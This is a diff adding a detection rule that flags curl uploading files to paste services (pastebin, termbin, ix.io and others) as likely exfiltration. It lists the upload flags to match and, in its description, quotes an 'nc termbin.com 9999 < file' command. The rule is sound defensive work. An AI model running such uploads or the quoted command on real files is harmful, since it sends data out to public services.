@@ -1,0 +1,43 @@
+title: Linux curl uploads a file to a paste service
+description: >
+  Detects curl using an upload option (`-T`, `--upload-file`, `-F`/`--form`, or a
+  `@file` body with `-d`, `--data` or `--data-binary`) with a command line that names
+  a paste or text-sharing service. A paste service holds text anyone with the link can
+  read, so a file sent there is a common low-effort exfiltration path. It records an
+  attempted command, not transferred bytes or a successful upload. `nc termbin.com 9999
+  < file` carries the file by redirection, not on the command line, and is not seen.
+  The storage and file-sharing services are covered by
+  `curl_upload_to_cloud_storage`; the EGRESS-DOMAIN rule (T1567.003) joins the lookup of
+  these names with the volume actually sent.
+tags:
+  - attack.exfiltration
+  - attack.t1567.003
+  - synthaea.coverage.collection_exfiltration
+level: medium
+falsepositives:
+  - Developers sharing a log or a diff with `curl -F` or `curl -T` to a paste service,
+    and CI jobs that publish output there.
+detection:
+  selection:
+    Image|endswith: '/curl'
+    CommandLine|contains:
+      - '--upload-file'
+      - ' -T'
+      - ' -F '
+      - '--form '
+      - ' -d @'
+      - '--data @'
+      - '--data-binary @'
+    CommandLine:
+      - '*pastebin.com*'
+      - '*paste.ee*'
+      - '*hastebin.com*'
+      - '*rentry.co*'
+      - '*controlc.com*'
+      - '*dpaste.com*'
+      - '*dpaste.org*'
+      - '*://ix.io*'
+      - '*termbin.com*'
+      - '*justpaste.it*'
+      - '*privatebin.net*'
+  condition: selection
